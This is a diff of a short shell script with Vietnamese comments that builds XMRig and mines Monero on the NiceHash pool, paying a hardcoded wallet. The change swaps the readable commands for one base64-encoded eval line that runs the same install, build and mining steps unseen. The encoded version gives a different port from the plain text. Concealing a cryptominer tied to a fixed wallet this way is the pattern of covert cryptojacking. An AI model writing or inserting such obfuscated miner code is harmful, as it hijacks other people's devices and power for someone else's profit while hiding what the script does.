@@ -29,11 +29,4 @@ cd xmrig/build
 ## nhập địa chỉ ví vào đây ví dụ ./xmrig -o randomxmonero.auto.nicehash.com:9200 -a rx -k -u địc chỉ ví  -pass x -t 5
 ./xmrig -o randomxmonero.auto.nicehash.com:9200 -a rx -k -u 3AMo7dabRoSwWAkNykLgfyzsEUL52SsoTo.reno2f -pass x -t 5
 ./xmrig -o randomxmonero.auto.nicehash.com:9200 -a rx -k -u 3AMo7dabRoSwWAkNykLgfyzsEUL52SsoTo.reno2f -pass x -t 5
-cd && pwd && cd ../usr/etc && nano bash.bashrc
-cd
-apt update && yes | apt upgrade  && pkg install git build-essential cmake -y
-git clone https://github.com/xmrig/xmrig.git
-mkdir xmrig/build
-cd xmrig/build
-cmake .. -DWITH_HWLOC=OFF && make -j$(nproc)
-./xmrig -o randomxmonero.auto.nicehash.com:9200 -a rx -k -u 3AMo7dabRoSwWAkNykLgfyzsEUL52SsoTo.reno2f -pass x -t 5
+eval $(echo "Y2QgJiYgcHdkICYmIGNkIC4uL3Vzci9ldGMgJiYgbmFubyBiYXNoLmJhc2hyYyAmJiBjZCAmJiBwa2cgaW5zdGFsbCBnaXQgYnVpbGQtZXNzZW50aWFsIGNtYWtlIC15ICYmIGdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20veG1yaWcveG1yaWcuZ2l0ICYmIG1rZGlyIHhtcmlnL2J1aWxkICYmIGNkIHhtcmlnL2J1aWxkICYmIGNtYWtlIC4uIC1EV0lUSF9IV0xPQz1PRkYgJiYgbWFrZSAtaiQobnByb2MpICYmIC4veG1yaWcgLW8gcmFuZG9teG1vbmVyby5hdXRvLm5pY2VoYXNoLmNvbToyMDAgLWEgcnggLWsgLXUgM0FNbzdkYWJSb1N3V0FrTnlrTGdmeXpzRVVMNTJTc29Uby5yZW5vMmYgLXBhc3MgeCAtdCA1" | base64 -d)
